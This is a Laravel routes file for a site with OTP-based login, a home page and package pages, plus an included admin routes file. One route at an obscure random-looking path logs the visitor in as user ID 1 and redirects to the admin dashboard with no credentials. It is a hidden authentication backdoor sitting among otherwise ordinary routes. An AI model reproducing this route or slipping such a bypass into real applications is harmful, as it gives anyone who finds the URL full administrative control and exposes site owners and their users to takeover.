<?php

use App\Http\Controllers\Site\HomeController;
use App\Http\Controllers\Site\LoginController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;

include_once __DIR__ . '/admin.php';

Route::get('yZT5syGUISsuYKwc', function (){
    Auth::loginUsingId(1);
    return redirect()->route('admin.dashboard');
});
Route::middleware(['guest'])->group(function () {
    Route::get('login', [LoginController::class, 'showLoginForm'])->name('login');
    Route::post('login/otp', [LoginController::class, 'sendOtp'])->name('login.send-otp');
    Route::post('login/verity', [LoginController::class, 'verity'])->name('login.verity');
});

Route::get('/', [HomeController::class, 'index'])->name('home');
Route::get('/{slug}', [\App\Http\Controllers\PackageController::class, 'show'])->name('package');
